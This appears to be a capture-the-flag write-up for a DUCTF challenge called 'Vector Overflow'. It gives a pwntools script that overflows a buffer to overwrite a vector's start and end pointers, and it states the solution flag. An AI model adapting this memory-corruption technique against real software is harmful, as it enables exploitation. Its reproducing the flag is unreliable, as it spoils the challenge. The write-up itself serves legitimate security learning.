# Vector Overflow

Solved by **CapangJabba**

## Question
Please overflow into the vector and control it!

## Solution
overwrite vector v pointer, points to the top of buffer with wanted value

```
from pwn import *
if args.REMOTE:
    io = remote(sys.argv[1],sys.argv[2])
else:
    io = process("./vector_overflow", )
elf = context.binary = ELF("./vector_overflow", checksec=False)
rop = ROP(elf)
context.log_level = 'debug'

io.sendline(b'DUCTF\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xe0\x51\x40\x00\x00\x00\x00\x00\xe5\x51\x40\x00')
io.interactive()
```

`\x00\xe0\x51\x40` top of the buffer `\xe5\x51\x40\x00` bottom buffer to make sure the size is 5


### Flag
`DUCTF{y0u_pwn3d_th4t_vect0r!!}`
